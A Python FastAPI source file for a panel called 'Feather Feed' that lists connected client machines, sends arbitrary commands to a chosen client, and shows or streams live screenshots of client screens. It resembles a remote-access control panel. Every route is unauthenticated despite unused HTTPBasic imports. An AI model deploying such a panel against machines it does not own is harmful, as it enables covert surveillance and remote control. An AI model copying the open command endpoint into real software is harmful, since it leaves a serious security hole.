import time
import os
import logging
from typing import List, Annotated
import secrets
import asyncio

from fastapi import FastAPI, Response, Request, HTTPException, Depends, Cookie
from fastapi.params import Form
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles


from config import TIMEOUT, FPS

# Первоначальная настройка
app = FastAPI(
    title="Feather Feed",
    docs_url=None, redoc_url=None
)

log = logging.getLogger('uvicorn')

# Константы1
_FRAME_DELAY = 1/FPS

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

from fastapi.responses import FileResponse

# Подключение папки со статическими файлами
STATIC_DIR = os.path.join(BASE_DIR, "static")
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")

# Шаблоны
templates = Jinja2Templates(directory=TEMPLATES_DIR)

# Добавление маршрута для favicon
@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    favicon_path = os.path.join(STATIC_DIR, "favicon.ico")
    return FileResponse(favicon_path)

# Общедоступные

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    server = app.state.server
    if not server:
        raise HTTPException(status_code=500, detail="Server not initialized")
    with server.clients_lock:
        client_list = [f"{addr[0]}:{addr[1]}" for addr in server.clients]
    return templates.TemplateResponse("index.html", {"request": request, "clients": client_list})

@app.get("/command", response_class=HTMLResponse)
async def command_form(request: Request):
    return templates.TemplateResponse("command.html", {"request": request})

@app.post("/command")
async def send_command(ip: str = Form(), command: str = Form()):
    try:
        server = app.state.server
        if not server:
            return {"status": "error", "message": "Server not initialized"}
            
        success = server.send_command_to_client(ip, command)
        
        if success:
            return {"status": "success", "message": "Command sent successfully"}
        else:
            return {"status": "error", "message": "Failed to send command"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# Получение ip,port всех онлайн клиентов (json)
@app.get("/clients", response_model=List[List[str]])
async def get_clients():
    server = app.state.server
    if not server:
        raise HTTPException(status_code=500)
    with server.clients_lock:
        client_list = [[addr[0], str(addr[1])] for addr in server.clients]
    return client_list

# Получение количества онлайн клиентов (json)
@app.get("/number_clients")
async def get_number_clients():
    server = app.state.server
    if not server:
        raise HTTPException(status_code=500)
    with server.clients_lock:
        count = len(server.clients)
    return count

# Получение скрина в момент времени клиента (jpg)
@app.get("/screenshot/{client_id}", response_class=Response)
async def screenshot(client_id: str):
    server = app.state.server
    if not server:
        raise HTTPException(status_code=500, detail="Server not initialized")
    try:
        ip, port = client_id.rsplit(':', 1)
        client_addr = (ip, int(port))
    except ValueError:
        raise HTTPException(status_code=404, detail="Invalid client ID format")

    with server.clients_lock:
        if client_addr not in server.clients:
            raise HTTPException(status_code=404, detail="Client not found")

        client = server.clients[client_addr]
        frames = client.get_frames()  # Получаем кадры из метода get_frames
        if not frames:
            raise HTTPException(status_code=404, detail="No frames available")

        jpeg_data = frames[-1]  # Берем последний доступный кадр

    return Response(content=jpeg_data, media_type="image/jpeg")

# Потоковая передача видео для конкретного клиента (jpg's)
@app.get("/video/{client_id}")
async def video_feed(client_id: str):
    server = app.state.server
    if not server:
        raise HTTPException(status_code=500)
    try:
        ip, port = client_id.rsplit(':', 1)
        client_addr = (ip, int(port))
    except ValueError:
        raise HTTPException(status_code=404)

    with server.clients_lock:
        if client_addr not in server.clients:
            raise HTTPException(status_code=404)

    async def generate():
        next_frame_time = time.time()
        while client_addr in server.clients:
            with server.clients_lock:
                client = server.clients[client_addr]
                frames = client.get_frames()  # Получаем кадры из метода get_frames
                if frames:
                    for frame in frames:
                        yield (b'--frame\r\n'
                               b'Content-Type: image/jpeg\r\n\r\n'
                               + frame + b'\r\n')
            next_frame_time += _FRAME_DELAY
            sleep_time = next_frame_time - time.time()
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)

    return StreamingResponse(generate(),
                             media_type="multipart/x-mixed-replace; boundary=frame",
                             headers={"Cache-Control": "no-cache, no-store, must-revalidate"})

# Поток событий
@app.get("/stream")
async def stream():
    server = app.state.server
    if not server:
        raise HTTPException(status_code=500)

    async def event_stream():
        prev_clients = set()
        while True:
            with server.clients_lock:
                current_clients = set(f"{addr[0]}:{addr[1]}" for addr in server.clients)
            if current_clients != prev_clients:
                data = ','.join(current_clients) if current_clients else "empty"
                yield f"data: {data}\n\n"
                prev_clients = current_clients
            await asyncio.sleep(0.1)

    return StreamingResponse(event_stream(), media_type="text/event-stream")